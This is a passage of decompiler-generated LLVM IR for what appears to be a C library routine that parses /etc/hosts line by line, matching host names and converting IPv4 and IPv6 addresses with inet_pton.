dec_label_pc_1000f680:                            ; preds = %dec_label_pc_1000f670
  %v0_1000f680 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f680 = add i32 %v0_1000f680, -36
  store i32 %v1_1000f680, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_1000f680, 8
  br i1 %tmp51, label %dec_label_pc_1000f90c, label %dec_label_pc_1000f68c

dec_label_pc_1000f68c:                            ; preds = %dec_label_pc_1000f680
  %v0_1000f68c = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_1000f68c, 16
  br i1 %tmp52, label %dec_label_pc_1000f90c, label %dec_label_pc_1000f694

dec_label_pc_1000f694:                            ; preds = %dec_label_pc_1000f68c
  %v1_1000f694 = add i32 %v0_1000f680, -48
  store i32 %v1_1000f694, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_1000f694, 8
  br i1 %tmp53, label %dec_label_pc_1000f90c, label %dec_label_pc_1000f6a0

dec_label_pc_1000f6a0:                            ; preds = %dec_label_pc_1000f694
  %v1_1000f6a0 = add i32 %v0_1000f680, -56
  store i32 %v1_1000f6a0, i32* %r0.global-to-local, align 4
  %v1_1000f6a4 = add i32 %v0_1000f680, -44
  store i32 %v1_1000f6a4, i32* @r27, align 4
  %v3_1000f6a8 = icmp ugt i32 %v1_1000f6a0, %v1_1000f6a4
  %v0_1000f6ac = load i32, i32* @r30, align 4
  %v1_1000f6ac = add i32 %v0_1000f6ac, 36
  store i32 %v1_1000f6ac, i32* @r29, align 4
  %v1_1000f6b0 = add i32 %v0_1000f6ac, 48
  store i32 %v1_1000f6b0, i32* @r26, align 4
  br i1 %v3_1000f6a8, label %dec_label_pc_1000f6c4, label %dec_label_pc_1000f6bc

dec_label_pc_1000f6bc:                            ; preds = %dec_label_pc_1000f6a0
  store i32 %v1_1000f6a0, i32* @r27, align 4
  br label %dec_label_pc_1000f6c4

dec_label_pc_1000f6c4:                            ; preds = %dec_label_pc_1000f6a0, %dec_label_pc_1000f6bc
  %v0_1000f6c4 = phi i32 [ %v1_1000f6a0, %dec_label_pc_1000f6bc ], [ %v1_1000f6a4, %dec_label_pc_1000f6a0 ]
  %tmp54 = icmp ult i32 %v0_1000f6c4, 80
  br i1 %tmp54, label %dec_label_pc_1000f90c, label %dec_label_pc_1000f6cc

dec_label_pc_1000f6cc:                            ; preds = %dec_label_pc_1000f6c4
  store i32 268498640, i32* @lr, align 4
  %v0_1000f6cc = call i32 @__open_etc_hosts()
  store i32 %v0_1000f6cc, i32* @r20, align 4
  %v3_1000f6d0 = icmp eq i32 %v0_1000f6cc, 0
  br i1 %v3_1000f6d0, label %dec_label_pc_1000f6f0, label %dec_label_pc_1000f6d8

dec_label_pc_1000f6d8:                            ; preds = %dec_label_pc_1000f6cc
  %v0_1000f6d8 = load i32, i32* @r24, align 4
  store i32 %v0_1000f6d8, i32* @r25, align 4
  %v0_1000f6e0 = load i32, i32* @r26, align 4
  store i32 %v0_1000f6e0, i32* @r23, align 4
  %v0_1000f6e4 = load i32, i32* @r31, align 4
  store i32 %v0_1000f6e4, i32* @r24, align 4
  store i32 %v0_1000f6d8, i32* %r21.global-to-local, align 4
  %v1_1000f780.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000f778

dec_label_pc_1000f6f0:                            ; preds = %dec_label_pc_1000f6cc
  %v1_1000f6f0 = load i32, i32* %r17.global-to-local, align 4
  %v2_1000f6f0 = inttoptr i32 %v1_1000f6f0 to i32*
  store i32 0, i32* %v2_1000f6f0, align 4
  %v0_1000f6f4 = call i32 @__errno_location()
  %v1_1000f6f8 = inttoptr i32 %v0_1000f6f4 to i32*
  %v2_1000f6f8 = load i32, i32* %v1_1000f6f8, align 4
  store i32 %v2_1000f6f8, i32* @r26, align 4
  br label %dec_label_pc_1000f910

dec_label_pc_1000f700:                            ; preds = %dec_label_pc_1000f8a0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000f704 = load i32, i32* @r25, align 4
  %v1_1000f704 = load i32, i32* @r22, align 4
  %v2_1000f704 = inttoptr i32 %v1_1000f704 to i32*
  store i32 %v0_1000f704, i32* %v2_1000f704, align 4
  %v0_1000f708 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f708 = load i32, i32* @r22, align 4
  %v2_1000f708 = add i32 %v1_1000f708, 4
  %v3_1000f708 = inttoptr i32 %v2_1000f708 to i32*
  store i32 %v0_1000f708, i32* %v3_1000f708, align 4
  %v0_1000f70c = load i32, i32* @r30, align 4
  %v1_1000f70c = add i32 %v0_1000f70c, 8
  store i32 %v1_1000f70c, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000f714 = add i32 %v0_1000f70c, 4
  %v2_1000f714 = inttoptr i32 %v1_1000f714 to i32*
  %v3_1000f714 = load i32, i32* %v2_1000f714, align 4
  store i32 %v3_1000f714, i32* %r0.global-to-local, align 4
  %v0_1000f718 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000f718 = load i32, i32* @r28, align 4
  %v2_1000f718 = add i32 %v1_1000f718, 8
  %v3_1000f718 = inttoptr i32 %v2_1000f718 to i32*
  store i32 %v0_1000f718, i32* %v3_1000f718, align 4
  %v0_1000f71c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f71c = load i32, i32* @r28, align 4
  %v2_1000f71c = inttoptr i32 %v1_1000f71c to i32*
  store i32 %v0_1000f71c, i32* %v2_1000f71c, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000f724 = load i32, i32* @r28, align 4
  %v2_1000f724 = add i32 %v1_1000f724, 12
  %v3_1000f724 = inttoptr i32 %v2_1000f724 to i32*
  store i32 4, i32* %v3_1000f724, align 4
  %v0_1000f728 = load i32, i32* @r22, align 4
  %v1_1000f728 = load i32, i32* @r28, align 4
  %v2_1000f728 = add i32 %v1_1000f728, 16
  %v3_1000f728 = inttoptr i32 %v2_1000f728 to i32*
  store i32 %v0_1000f728, i32* %v3_1000f728, align 4
  br label %dec_label_pc_1000f75c

dec_label_pc_1000f730:                            ; preds = %dec_label_pc_1000f8c4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000f734 = load i32, i32* %r21.global-to-local, align 4
  %v1_1000f734 = load i32, i32* @r23, align 4
  %v2_1000f734 = inttoptr i32 %v1_1000f734 to i32*
  store i32 %v0_1000f734, i32* %v2_1000f734, align 4
  %v0_1000f738 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f738 = load i32, i32* @r23, align 4
  %v2_1000f738 = add i32 %v1_1000f738, 4
  %v3_1000f738 = inttoptr i32 %v2_1000f738 to i32*
  store i32 %v0_1000f738, i32* %v3_1000f738, align 4
  %v0_1000f73c = load i32, i32* @r30, align 4
  %v1_1000f73c = add i32 %v0_1000f73c, 8
  store i32 %v1_1000f73c, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000f744 = add i32 %v0_1000f73c, 4
  %v2_1000f744 = inttoptr i32 %v1_1000f744 to i32*
  %v3_1000f744 = load i32, i32* %v2_1000f744, align 4
  store i32 %v3_1000f744, i32* %r0.global-to-local, align 4
  %v0_1000f748 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000f748 = load i32, i32* @r28, align 4
  %v2_1000f748 = add i32 %v1_1000f748, 8
  %v3_1000f748 = inttoptr i32 %v2_1000f748 to i32*
  store i32 %v0_1000f748, i32* %v3_1000f748, align 4
  %v0_1000f74c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f74c = load i32, i32* @r28, align 4
  %v2_1000f74c = inttoptr i32 %v1_1000f74c to i32*
  store i32 %v0_1000f74c, i32* %v2_1000f74c, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_1000f754 = load i32, i32* @r28, align 4
  %v2_1000f754 = add i32 %v1_1000f754, 12
  %v3_1000f754 = inttoptr i32 %v2_1000f754 to i32*
  store i32 16, i32* %v3_1000f754, align 4
  %v0_1000f758 = load i32, i32* @r23, align 4
  %v1_1000f758 = load i32, i32* @r28, align 4
  %v2_1000f758 = add i32 %v1_1000f758, 16
  %v3_1000f758 = inttoptr i32 %v2_1000f758 to i32*
  store i32 %v0_1000f758, i32* %v3_1000f758, align 4
  br label %dec_label_pc_1000f75c

dec_label_pc_1000f75c:                            ; preds = %dec_label_pc_1000f700, %dec_label_pc_1000f730
  %v0_1000f75c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f75c = load i32, i32* @r28, align 4
  %v2_1000f75c = add i32 %v1_1000f75c, 4
  %v3_1000f75c = inttoptr i32 %v2_1000f75c to i32*
  store i32 %v0_1000f75c, i32* %v3_1000f75c, align 4
  %v0_1000f760 = load i32, i32* @r28, align 4
  %v1_1000f760 = load i32, i32* %r17.global-to-local, align 4
  %v2_1000f760 = inttoptr i32 %v1_1000f760 to i32*
  store i32 %v0_1000f760, i32* %v2_1000f760, align 4
  br label %dec_label_pc_1000f8f8

dec_label_pc_1000f768:                            ; preds = %dec_label_pc_1000f660
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_1000f778

dec_label_pc_1000f778:                            ; preds = %dec_label_pc_1000f6d8, %dec_label_pc_1000f768
  %v1_1000f780 = phi i32 [ %v1_1000f780.pre, %dec_label_pc_1000f6d8 ], [ %arg8, %dec_label_pc_1000f768 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_1000f780 = inttoptr i32 %v1_1000f780 to i32*
  store i32 1, i32* %v2_1000f780, align 4
  br label %dec_label_pc_1000f8e0

dec_label_pc_1000f788:                            ; preds = %dec_label_pc_1000f8e0
  %v0_1000f788 = load i32, i32* @r24, align 4
  store i32 %v0_1000f788, i32* @r3, align 4
  store i32 268498836, i32* @lr, align 4
  %v2_1000f790 = call i32 @__GI_strchr(i32 %v0_1000f788, i32 35)
  %v4_1000f794 = icmp eq i32 %v2_1000f790, 0
  br i1 %v4_1000f794, label %dec_label_pc_1000f7a4, label %dec_label_pc_1000f79c

dec_label_pc_1000f79c:                            ; preds = %dec_label_pc_1000f788
  %v3_1000f790 = inttoptr i32 %v2_1000f790 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_1000f790, align 1
  br label %dec_label_pc_1000f7a4

dec_label_pc_1000f7a4:                            ; preds = %dec_label_pc_1000f788, %dec_label_pc_1000f79c
  %v0_1000f7a4 = load i32, i32* @r24, align 4
  store i32 %v0_1000f7a4, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_1000f82017 = inttoptr i32 %v0_1000f7a4 to i8*
  %v2_1000f82018 = load i8, i8* %v1_1000f82017, align 1
  %v3_1000f82019 = zext i8 %v2_1000f82018 to i32
  store i32 %v3_1000f82019, i32* %r0.global-to-local, align 4
  %v3_1000f82421 = icmp eq i8 %v2_1000f82018, 0
  br i1 %v3_1000f82421, label %dec_label_pc_1000f82c, label %dec_label_pc_1000f7bc.preheader

dec_label_pc_1000f7b0:                            ; preds = %dec_label_pc_1000f7cc
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000f7b4 = inttoptr i32 %v0_1000f7f0 to i8*
  store i8 0, i8* %v3_1000f7b4, align 1
  %v0_1000f7b8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f7b8 = add i32 %v0_1000f7b8, 1
  store i32 %v1_1000f7b8, i32* %r11.global-to-local, align 4
  %v1_1000f7bc = inttoptr i32 %v1_1000f7b8 to i8*
  %v2_1000f7bc = load i8, i8* %v1_1000f7bc, align 1
  %v3_1000f7bc = zext i8 %v2_1000f7bc to i32
  store i32 %v3_1000f7bc, i32* %r0.global-to-local, align 4
  %v3_1000f7c0 = icmp eq i8 %v2_1000f7bc, 0
  br i1 %v3_1000f7c0, label %dec_label_pc_1000f82c, label %dec_label_pc_1000f7cc

dec_label_pc_1000f7cc:                            ; preds = %dec_label_pc_1000f7bc.preheader, %dec_label_pc_1000f7b0
  %v0_1000f7f0 = phi i32 [ %v1_1000f7b8, %dec_label_pc_1000f7b0 ], [ %v0_1000f7bc2, %dec_label_pc_1000f7bc.preheader ]
  %v0_1000f7d4.in = phi i32 [ %v3_1000f7bc, %dec_label_pc_1000f7b0 ], [ %v3_1000f7bc5, %dec_label_pc_1000f7bc.preheader ]
  %v0_1000f7d4 = mul nuw nsw i32 %v0_1000f7d4.in, 2
  %v3_1000f7d0 = load i32, i32* @global_var_100234d8, align 4
  store i32 %v3_1000f7d0, i32* %r9.global-to-local, align 4
  %v2_1000f7d4 = add i32 %v3_1000f7d0, %v0_1000f7d4
  %v3_1000f7d4 = inttoptr i32 %v2_1000f7d4 to i16*
  %v4_1000f7d4 = load i16, i16* %v3_1000f7d4, align 2
  %v5_1000f7d4 = zext i16 %v4_1000f7d4 to i32
  store i32 %v5_1000f7d4, i32* %r0.global-to-local, align 4
  %v1_1000f7d8 = and i32 %v5_1000f7d4, 32
  store i32 %v1_1000f7d8, i32* %r9.global-to-local, align 4
  %v3_1000f7d8 = icmp eq i32 %v1_1000f7d8, 0
  br i1 %v3_1000f7d8, label %dec_label_pc_1000f7e0, label %dec_label_pc_1000f7b0

dec_label_pc_1000f7e0:                            ; preds = %dec_label_pc_1000f7cc
  %v0_1000f7e0 = load i32, i32* @r29, align 4
  %v2_1000f7e0 = icmp sgt i32 %v0_1000f7e0, 6
  br i1 %v2_1000f7e0, label %dec_label_pc_1000f7fc.preheader, label %dec_label_pc_1000f7e8

dec_label_pc_1000f7e8:                            ; preds = %dec_label_pc_1000f7e0
  %v1_1000f7e8 = mul i32 %v0_1000f7e0, 4
  store i32 %v1_1000f7e8, i32* %r0.global-to-local, align 4
  %v1_1000f7ec = add i32 %v0_1000f7e0, 1
  store i32 %v1_1000f7ec, i32* @r29, align 4
  %v1_1000f7f0 = load i32, i32* @r30, align 4
  %v3_1000f7f0 = add i32 %v1_1000f7f0, %v1_1000f7e8
  %v4_1000f7f0 = inttoptr i32 %v3_1000f7f0 to i32*
  store i32 %v0_1000f7f0, i32* %v4_1000f7f0, align 4
  %v0_1000f7fc9.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f7fc.preheader

dec_label_pc_1000f7fc.preheader:                  ; preds = %dec_label_pc_1000f7e8, %dec_label_pc_1000f7e0
  %v0_1000f7fc9 = phi i32 [ %v0_1000f7fc9.pre, %dec_label_pc_1000f7e8 ], [ %v0_1000f7f0, %dec_label_pc_1000f7e0 ]
  %v1_1000f7fc10 = inttoptr i32 %v0_1000f7fc9 to i8*
  %v2_1000f7fc11 = load i8, i8* %v1_1000f7fc10, align 1
  %v3_1000f7fc12 = zext i8 %v2_1000f7fc11 to i32
  store i32 %v3_1000f7fc12, i32* %r0.global-to-local, align 4
  %v3_1000f80014 = icmp eq i8 %v2_1000f7fc11, 0
  br i1 %v3_1000f80014, label %dec_label_pc_1000f820.loopexit, label %dec_label_pc_1000f80c.lr.ph

dec_label_pc_1000f80c.lr.ph:                      ; preds = %dec_label_pc_1000f7fc.preheader
  %v3_1000f810.pre = load i32, i32* @global_var_100234d8, align 4
  br label %dec_label_pc_1000f80c

dec_label_pc_1000f7f8:                            ; preds = %dec_label_pc_1000f80c
  %v1_1000f7f8 = add i32 %v0_1000f7f8, 1
  store i32 %v1_1000f7f8, i32* %r11.global-to-local, align 4
  %v1_1000f7fc = inttoptr i32 %v1_1000f7f8 to i8*
  %v2_1000f7fc = load i8, i8* %v1_1000f7fc, align 1
  %v3_1000f7fc = zext i8 %v2_1000f7fc to i32
  store i32 %v3_1000f7fc, i32* %r0.global-to-local, align 4
  %v3_1000f800 = icmp eq i8 %v2_1000f7fc, 0
  br i1 %v3_1000f800, label %dec_label_pc_1000f820.loopexit, label %dec_label_pc_1000f80c

dec_label_pc_1000f80c:                            ; preds = %dec_label_pc_1000f80c.lr.ph, %dec_label_pc_1000f7f8
  %v0_1000f7f8 = phi i32 [ %v0_1000f7fc9, %dec_label_pc_1000f80c.lr.ph ], [ %v1_1000f7f8, %dec_label_pc_1000f7f8 ]
  %v0_1000f814.in = phi i32 [ %v3_1000f7fc12, %dec_label_pc_1000f80c.lr.ph ], [ %v3_1000f7fc, %dec_label_pc_1000f7f8 ]
  %v0_1000f814 = mul nuw nsw i32 %v0_1000f814.in, 2
  store i32 %v3_1000f810.pre, i32* %r9.global-to-local, align 4
  %v2_1000f814 = add i32 %v0_1000f814, %v3_1000f810.pre
  %v3_1000f814 = inttoptr i32 %v2_1000f814 to i16*
  %v4_1000f814 = load i16, i16* %v3_1000f814, align 2
  %v5_1000f814 = zext i16 %v4_1000f814 to i32
  store i32 %v5_1000f814, i32* %r0.global-to-local, align 4
  %v1_1000f818 = and i32 %v5_1000f814, 32
  store i32 %v1_1000f818, i32* %r9.global-to-local, align 4
  %v3_1000f818 = icmp eq i32 %v1_1000f818, 0
  br i1 %v3_1000f818, label %dec_label_pc_1000f7f8, label %dec_label_pc_1000f820.loopexit

dec_label_pc_1000f820.loopexit:                   ; preds = %dec_label_pc_1000f80c, %dec_label_pc_1000f7f8, %dec_label_pc_1000f7fc.preheader
  %v0_1000f820 = phi i32 [ %v0_1000f7fc9, %dec_label_pc_1000f7fc.preheader ], [ %v0_1000f7f8, %dec_label_pc_1000f80c ], [ %v1_1000f7f8, %dec_label_pc_1000f7f8 ]
  %v1_1000f820 = inttoptr i32 %v0_1000f820 to i8*
  %v2_1000f820 = load i8, i8* %v1_1000f820, align 1
  %v3_1000f820 = zext i8 %v2_1000f820 to i32
  store i32 %v3_1000f820, i32* %r0.global-to-local, align 4
  %v3_1000f824 = icmp eq i8 %v2_1000f820, 0
  br i1 %v3_1000f824, label %dec_label_pc_1000f82c, label %dec_label_pc_1000f7bc.preheader

dec_label_pc_1000f7bc.preheader:                  ; preds = %dec_label_pc_1000f7a4, %dec_label_pc_1000f820.loopexit
  %v0_1000f7bc2 = phi i32 [ %v0_1000f820, %dec_label_pc_1000f820.loopexit ], [ %v0_1000f7a4, %dec_label_pc_1000f7a4 ]
  %v1_1000f7bc3 = inttoptr i32 %v0_1000f7bc2 to i8*
  %v2_1000f7bc4 = load i8, i8* %v1_1000f7bc3, align 1
  %v3_1000f7bc5 = zext i8 %v2_1000f7bc4 to i32
  store i32 %v3_1000f7bc5, i32* %r0.global-to-local, align 4
  %v3_1000f7c07 = icmp eq i8 %v2_1000f7bc4, 0
  br i1 %v3_1000f7c07, label %dec_label_pc_1000f82c, label %dec_label_pc_1000f7cc

dec_label_pc_1000f82c:                            ; preds = %dec_label_pc_1000f820.loopexit, %dec_label_pc_1000f7bc.preheader, %dec_label_pc_1000f7b0, %dec_label_pc_1000f7a4
  %v0_1000f82c = load i32, i32* @r29, align 4
  %v1_1000f830 = mul i32 %v0_1000f82c, 4
  store i32 %v1_1000f830, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000f838 = load i32, i32* @r30, align 4
  %v3_1000f838 = add i32 %v2_1000f838, %v1_1000f830
  %v4_1000f838 = inttoptr i32 %v3_1000f838 to i32*
  store i32 0, i32* %v4_1000f838, align 4
  %tmp55 = icmp slt i32 %v0_1000f82c, 2
  br i1 %tmp55, label %dec_label_pc_1000f8e0, label %dec_label_pc_1000f840

dec_label_pc_1000f840:                            ; preds = %dec_label_pc_1000f82c
  %v0_1000f840 = load i32, i32* %r18.global-to-local, align 4
  %v3_1000f840 = icmp eq i32 %v0_1000f840, 1
  br i1 %v3_1000f840, label %dec_label_pc_1000f8f8, label %dec_label_pc_1000f848

dec_label_pc_1000f848:                            ; preds = %dec_label_pc_1000f840
  %v3_1000f848 = icmp eq i32 %v0_1000f840, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_1000f848, label %dec_label_pc_1000f854, label %dec_label_pc_1000f880.preheader

dec_label_pc_1000f880.preheader:                  ; preds = %dec_label_pc_1000f848
  %v1_1000f88023 = load i32, i32* @r29, align 4
  %v2_1000f88024 = icmp sgt i32 %v1_1000f88023, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000f88829 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000f88829, i32* @r3, align 4
  br i1 %v2_1000f88024, label %dec_label_pc_1000f86c, label %dec_label_pc_1000f890

dec_label_pc_1000f854:                            ; preds = %dec_label_pc_1000f848
  %v0_1000f854 = load i32, i32* @r30, align 4
  %v1_1000f854 = inttoptr i32 %v0_1000f854 to i32*
  %v2_1000f854 = load i32, i32* %v1_1000f854, align 4
  store i32 %v2_1000f854, i32* @r4, align 4
  %v0_1000f858 = load i32, i32* %r15.global-to-local, align 4
  %v2_1000f85c = inttoptr i32 %v0_1000f858 to i8*
  %v3_1000f85c = call i32 @__GI_strcoll(i8* %v2_1000f85c, i32 %v2_1000f854)
  %v3_1000f860 = icmp eq i32 %v3_1000f85c, 0
  br i1 %v3_1000f860, label %dec_label_pc_1000f898, label %dec_label_pc_1000f8e0

dec_label_pc_1000f86c:                            ; preds = %dec_label_pc_1000f880.preheader, %dec_label_pc_1000f87c
  %v1_1000f86c = phi i32 [ %v1_1000f884, %dec_label_pc_1000f87c ], [ 4, %dec_label_pc_1000f880.preheader ]
  %v0_1000f88831 = phi i32 [ %v0_1000f888, %dec_label_pc_1000f87c ], [ %v0_1000f88829, %dec_label_pc_1000f880.preheader ]
  %v0_1000f86c = load i32, i32* @r30, align 4
  %v2_1000f86c = add i32 %v0_1000f86c, %v1_1000f86c
  %v3_1000f86c = inttoptr i32 %v2_1000f86c to i32*
  %v4_1000f86c = load i32, i32* %v3_1000f86c, align 4
  store i32 %v4_1000f86c, i32* @r4, align 4
  %v2_1000f870 = call i32 @__GI_strcasecmp(i32 %v0_1000f88831, i32 %v4_1000f86c)
  %v3_1000f874 = icmp eq i32 %v2_1000f870, 0
  %v0_1000f890.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000f874, label %dec_label_pc_1000f86c.dec_label_pc_1000f890_crit_edge, label %dec_label_pc_1000f87c

dec_label_pc_1000f87c:                            ; preds = %dec_label_pc_1000f86c
  %v1_1000f87c = add i32 %v0_1000f890.pre, 1
  store i32 %v1_1000f87c, i32* @r31, align 4
  %v1_1000f880 = load i32, i32* @r29, align 4
  %v2_1000f880 = icmp slt i32 %v1_1000f87c, %v1_1000f880
  %v1_1000f884 = mul i32 %v1_1000f87c, 4
  store i32 %v1_1000f884, i32* %r0.global-to-local, align 4
  %v0_1000f888 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000f888, i32* @r3, align 4
  br i1 %v2_1000f880, label %dec_label_pc_1000f86c, label %dec_label_pc_1000f890

dec_label_pc_1000f86c.dec_label_pc_1000f890_crit_edge: ; preds = %dec_label_pc_1000f86c
  %v1_1000f890.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000f890

dec_label_pc_1000f890:                            ; preds = %dec_label_pc_1000f87c, %dec_label_pc_1000f86c.dec_label_pc_1000f890_crit_edge, %dec_label_pc_1000f880.preheader
  %v1_1000f890 = phi i32 [ %v1_1000f890.pre, %dec_label_pc_1000f86c.dec_label_pc_1000f890_crit_edge ], [ %v1_1000f88023, %dec_label_pc_1000f880.preheader ], [ %v1_1000f880, %dec_label_pc_1000f87c ]
  %v0_1000f890 = phi i32 [ %v0_1000f890.pre, %dec_label_pc_1000f86c.dec_label_pc_1000f890_crit_edge ], [ 1, %dec_label_pc_1000f880.preheader ], [ %v1_1000f87c, %dec_label_pc_1000f87c ]
  %v2_1000f890 = icmp slt i32 %v0_1000f890, %v1_1000f890
  br i1 %v2_1000f890, label %dec_label_pc_1000f898, label %dec_label_pc_1000f8e0

dec_label_pc_1000f898:                            ; preds = %dec_label_pc_1000f854, %dec_label_pc_1000f890
  %v0_1000f898 = load i32, i32* %r19.global-to-local, align 4
  %v3_1000f898 = icmp eq i32 %v0_1000f898, 2
  br i1 %v3_1000f898, label %dec_label_pc_1000f8a0, label %dec_label_pc_1000f8bc

dec_label_pc_1000f8a0:                            ; preds = %dec_label_pc_1000f898
  %v0_1000f8a0 = load i32, i32* @r30, align 4
  %v1_1000f8a0 = inttoptr i32 %v0_1000f8a0 to i32*
  %v2_1000f8a0 = load i32, i32* %v1_1000f8a0, align 4
  %v0_1000f8a8 = load i32, i32* @r25, align 4
  store i32 268499120, i32* @lr, align 4
  %v3_1000f8ac = inttoptr i32 %v2_1000f8a0 to i8*
  %v4_1000f8ac = call i32 @inet_pton(i32 2, i8* %v3_1000f8ac, i32 %v0_1000f8a8)
  %v2_1000f8b0 = icmp sgt i32 %v4_1000f8ac, 0
  br i1 %v2_1000f8b0, label %dec_label_pc_1000f700, label %dec_label_pc_1000f8dc

dec_label_pc_1000f8bc:                            ; preds = %dec_label_pc_1000f898
  %v3_1000f8bc = icmp eq i32 %v0_1000f898, 10
  br i1 %v3_1000f8bc, label %dec_label_pc_1000f8c4, label %dec_label_pc_1000f8dc

dec_label_pc_1000f8c4:                            ; preds = %dec_label_pc_1000f8bc
  %v0_1000f8c4 = load i32, i32* @r30, align 4
  %v1_1000f8c4 = inttoptr i32 %v0_1000f8c4 to i32*
  %v2_1000f8c4 = load i32, i32* %v1_1000f8c4, align 4
  %v0_1000f8cc = load i32, i32* %r21.global-to-local, align 4
  store i32 268499156, i32* @lr, align 4
  %v3_1000f8d0 = inttoptr i32 %v2_1000f8c4 to i8*
  %v4_1000f8d0 = call i32 @inet_pton(i32 10, i8* %v3_1000f8d0, i32 %v0_1000f8cc)
  %v2_1000f8d4 = icmp sgt i32 %v4_1000f8d0, 0
  br i1 %v2_1000f8d4, label %dec_label_pc_1000f730, label %dec_label_pc_1000f8dc

dec_label_pc_1000f8dc:                            ; preds = %dec_label_pc_1000f8a0, %dec_label_pc_1000f8bc, %dec_label_pc_1000f8c4
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_1000f8e0

dec_label_pc_1000f8e0:                            ; preds = %dec_label_pc_1000f890, %dec_label_pc_1000f854, %dec_label_pc_1000f82c, %dec_label_pc_1000f8dc, %dec_label_pc_1000f778
  %v0_1000f8e0 = load i32, i32* @r24, align 4
  %v0_1000f8e4 = load i32, i32* @r27, align 4
  %v0_1000f8e8 = load i32, i32* @r20, align 4
  store i32 268499184, i32* @lr, align 4
  %v3_1000f8ec = call i32 @fgets(i32 %v0_1000f8e0, i32 %v0_1000f8e4, i32 %v0_1000f8e8)
  %v3_1000f8f0 = icmp eq i32 %v3_1000f8ec, 0
  br i1 %v3_1000f8f0, label %dec_label_pc_1000f8f8, label %dec_label_pc_1000f788

dec_label_pc_1000f8f8:                            ; preds = %dec_label_pc_1000f8e0, %dec_label_pc_1000f840, %dec_label_pc_1000f75c
  %v0_1000f8f8 = load i32, i32* %r18.global-to-local, align 4
  %v3_1000f8f8 = icmp eq i32 %v0_1000f8f8, 1
  br i1 %v3_1000f8f8, label %dec_label_pc_1000f910, label %dec_label_pc_1000f900

dec_label_pc_1000f900:                            ; preds = %dec_label_pc_1000f8f8
  %v0_1000f900 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_1000f908.414 to i32), i32* @lr, align 4
  %v1_1000f904 = inttoptr i32 %v0_1000f900 to i16*
  %v2_1000f904 = call i32 @__GI_fclose(i16* %v1_1000f904)
  br label %dec_label_pc_1000f910

dec_label_pc_1000f90c:                            ; preds = %dec_label_pc_1000f6c4, %dec_label_pc_1000f694, %dec_label_pc_1000f68c, %dec_label_pc_1000f680, %dec_label_pc_1000f670, %dec_label_pc_1000f658, %dec_label_pc_1000f648
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_1000f910

dec_label_pc_1000f910:                            ; preds = %dec_label_pc_1000f8f8, %dec_label_pc_1000f900, %dec_label_pc_1000f6f0, %dec_label_pc_1000f90c
  store i32 %v0_1000f60c, i32* %r0.global-to-local, align 4
  %v0_1000f914 = load i32, i32* @r26, align 4
  ret i32 %v0_1000f914

; uselistorder directives
  uselistorder i32 %v0_1000f888, { 1, 0 }
  uselistorder i32 %v1_1000f87c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000f830, { 1, 0 }
  uselistorder i32 %v0_1000f82c, { 1, 0 }
  uselistorder i32 %v3_1000f7bc5, { 1, 0 }
  uselistorder i32 %v0_1000f7bc2, { 1, 0 }
  uselistorder i32 %v1_1000f7e8, { 1, 0 }
  uselistorder i32 %v0_1000f7e0, { 1, 0, 2 }
  uselistorder i32 %v2_1000f790, { 1, 0 }
  uselistorder i32 %v0_1000f680, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000f658.pr, { 1, 0, 2 }
  uselistorder i32 %v1_1000f624, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 11, 29, 12, 26, 19, 13, 14, 27, 15, 16, 18, 17, 28, 20, 21, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 30 }
  uselistorder i32 34, { 5, 6, 9, 1, 2, 3, 7, 8, 4, 0 }
  uselistorder i32 (i16*)* @__GI_fclose, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0, 2 }
